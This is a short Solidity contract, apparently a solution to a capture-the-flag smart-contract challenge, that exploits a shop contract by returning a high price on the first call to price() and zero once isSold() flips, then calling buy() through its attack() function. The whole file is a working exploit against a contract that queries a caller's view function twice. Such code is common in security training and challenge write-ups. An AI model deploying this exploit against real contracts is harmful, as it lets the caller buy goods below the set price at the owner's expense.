pragma solidity ^0.8;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShoppingFree {
    function price() public view returns (uint256) {
        IShop shop = IShop(msg.sender);
        if (shop.isSold()) {
            return 0;
        } else {
            return 101;
        }
    }

    function attack(address target) public {
        IShop shop = IShop(target);
        shop.buy();
    }
}